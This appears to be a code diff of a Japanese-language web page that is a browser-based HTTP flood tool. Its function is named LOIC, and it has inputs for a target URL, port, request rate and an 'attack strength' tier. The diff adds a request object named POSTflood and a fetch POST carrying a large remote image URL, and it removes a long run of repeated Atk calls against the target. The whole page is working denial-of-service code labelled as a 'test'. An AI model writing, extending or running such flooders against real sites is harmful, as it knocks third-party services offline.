@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html>
-
 <head>
   <script src="https://code.jquery.com/jquery.min.js"></script>
   <script>
-  function LOIC(target, port, requestsPerSecond)
+    function LOIC(target, port, requestsPerSecond)
         {
           var requested = 0;
           var succeeded = 0;
@@ -103,42 +102,19 @@
                   onSuccess()
                   onRequest()
               }
-            };
+              let POSTflood = new XMLHttpRequest();
+              POSTflood.open("GET", addr);
+              POSTflood.send();
+              const formData = new FormData();
+              formData.append("file", "https://cdn2.eso.org/images/original/eso1242a.psb");
+              fetch(addr, {method: "POST",body: formData})
+            }
               Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              Atk(addr, port)
-              let request = new XMLHttpRequest()
-              request.open('GET', addr);
-              request.responseType = 'json';
-              request.send();
-              document.getElementById("RES").textContent = JSON.stringify(request.response);
+              fetch(addr)
+.then(res =>  {
+  document.getElementById("RES").textContent = `${res.status}`;
+})
+          
             }
             document.getElementById("button").onclick = function()
             {
@@ -183,7 +159,7 @@ $(function () {
 });
   </script>
   <style>
-  #errors{
+    #errors{
       color: #f00;
       font-size: 10px;
     }
@@ -242,63 +218,39 @@ $(function () {
       right:0px
     }
   </style>
-  <title>西村砲 1X</title>
+  <title> 西村砲 1X </title>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.bundle.js"></script>
 </head>
-
 <body>
   <div class="container">
-    <div class="side-menu">
-    </div>
-    <div class="main-contents">
-      <input type="url" name="target" id="target" placeholder="URLを入力">
-      <br>
-      <input type="number" name="port" id="port" placeholder="ポート（任意）">
-      <br>
-      <input type="number" name="requestsPerSecond" id="requestsPerSecond" placeholder="リクエスト間隔（秒）">
-      <br>
-      <button name="button" id="button" onclick="javascript:LOIC(document.getElementById('target').value, document.getElementById('port').value, document.getElementById('requestsPerSecond').value);">テスト</button>
-      <br>
-      <sup name="errors" id="errors">
-      </sup>
-      <br>
-      <div class="status">リクエスト数:
-        <span name="requests" id="requests"></span>
-        <br>成功数:
-        <span name="succeeded" id="succeeded"></span>
-        <br>失敗数:
-        <span name="failed" id="failed"></span>
-        <br>Status:
-        <span name="status" id="status">未使用</span>
-      </div>
-      <br>
-      <span style="display:none;">
-        <iframe id="if1" height="5px" width="5px">
-        </iframe>
-        <iframe id="if2" height="5px" width="5px">
-        </iframe>
-        <iframe id="if3" height="5px" width="5px">
-        </iframe>
-        <iframe id="if4" height="5px" width="5px">
-        </iframe>
-        <iframe id="if5" height="5px" width="5px">
-        </iframe>
-      </span>
+    <div class="side-menu"> </div>
+    <div class="main-contents"> <input type="url" name="target" id="target" placeholder="URLを入力" /> <br /> <input type="number" name="port" id="port" placeholder="ポート（任意）" /> <br /> <input type="number" name="requestsPerSecond" id="requestsPerSecond" placeholder="リクエスト間隔（秒）" /> <br /> <input type="number" name="tier" id="tier" placeholder="連装オプション(多いほど強い)" /> <br> <button name="button" id="button" onclick="javascript:LOIC(document.getElementById('target').value, document.getElementById('port').value, document.getElementById('requestsPerSecond').value);">テスト</button> <br><sup name="errors" id="errors">
+        </sup> <br />
+      <div class="status"> リクエスト数: <span name="requests" id="requests">
+          0
+        </span> <br /> 成功数: <span name="succeeded" id="succeeded">
+          0
+        </span> <br /> 失敗数: <span name="failed" id="failed">
+          0
+        </span> <br /> Status: <span name="status" id="status">
+          未使用
+        </span></div><br> <span style="display:none;">
+      <iframe id="if1" height="5px" width="5px"></iframe>
+      <iframe id="if2" height="5px" width="5px"></iframe>
+      <iframe id="if3" height="5px" width="5px"></iframe>
+      <iframe id="if4" height="5px" width="5px"></iframe>
+      <iframe id="if5" height="5px" width="5px"></iframe>
+          </span>
       <h1 style="color: #dcf3fc;
              font-weight: bold;">Response</h1>
-      <div id="RES">
-      </div>
+      <div id="RES"></div>
       <div style="position: relative;
     width:  250px;
     height: 300px;
     overflow: hidden;
-    margin:20px;">
-        <canvas id="myPieChart">
-        </canvas>
-      </div>
+    margin:20px;"> <canvas id="myPieChart"></canvas> </div>
     </div>
   </div>
 </body>
-
 </html>
